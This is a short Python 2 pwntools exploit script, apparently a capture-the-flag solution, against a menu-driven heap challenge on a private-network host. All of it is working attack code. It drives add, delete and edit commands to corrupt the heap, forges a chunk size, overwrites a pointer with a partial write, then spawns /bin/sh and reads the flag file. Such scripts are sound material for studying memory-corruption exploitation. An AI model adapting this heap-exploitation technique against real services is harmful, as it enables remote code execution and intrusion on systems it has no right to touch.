#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"

def exp(r,port):
    conn=remote(r,port)
    def add(s):
        conn.sendline("R")
        conn.sendafter("Input your string!\n",s)
        conn.recvuntil("SAVED!")
    def dele(index):
        conn.sendline("D")
        conn.sendlineafter("Input your index:\n",str(index))
        conn.recvuntil("FREED!")

    def edit(index,s):
        conn.sendline("C")
        conn.sendafter("Input your index:",str(index))
        conn.sendafter("input your new string(no longer than the old one)\n",s)

    add("a"*0x68)
    add("a"*0x68)
    dele(0)

    add("a"*0xf+"\x00")

    f={
        0x67:"\x00",
        0xf0:p64(0),
        0xf8:p64(0x71),
    }
    add(fit(f,filler="a"))
    edit(2,p64(0x6B63c0))
    edit(0,"\x72\x82")
    conn.sendline("R")
    conn.sendline("/bin/sh")
    conn.clean()
    conn.sendline("cat flag")
    return conn.recv()

print exp("172.16.5.17",5051)
